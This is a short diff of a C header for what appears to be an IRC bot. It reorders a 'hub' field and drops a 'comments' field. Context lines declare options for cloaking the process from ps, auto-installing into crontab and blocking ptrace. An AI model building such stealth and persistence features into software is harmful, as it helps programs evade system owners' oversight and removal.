@@ -21,9 +21,9 @@ typedef struct conf_bot_b {
   struct conf_net_b net;
   pid_t pid;              /* contains the PID for the bot (read for the pidfile) */
   int localhub;         /* bot is localhub */
+  bool hub;		/* should bot behave as a hub? */
   char *nick;
   char *pid_file;       /* path and filename of the .pid file */
-  bool hub;		/* should bot behave as a hub? */
 } conf_bot;
 
 typedef struct conf_b {
@@ -34,7 +34,6 @@ typedef struct conf_b {
   int pscloak;          /* should the bots bother trying to cloak `ps`? */
   int autocron;         /* should the bot auto crontab itself? */
   int watcher;		/* spawn a watcher pid to block ptrace? */
-  char *comments;       /* we dont want to lose our comments now do we?! */
   char *localhub;	/* my localhub */
   char *uname;
   char *username;       /* shell username */
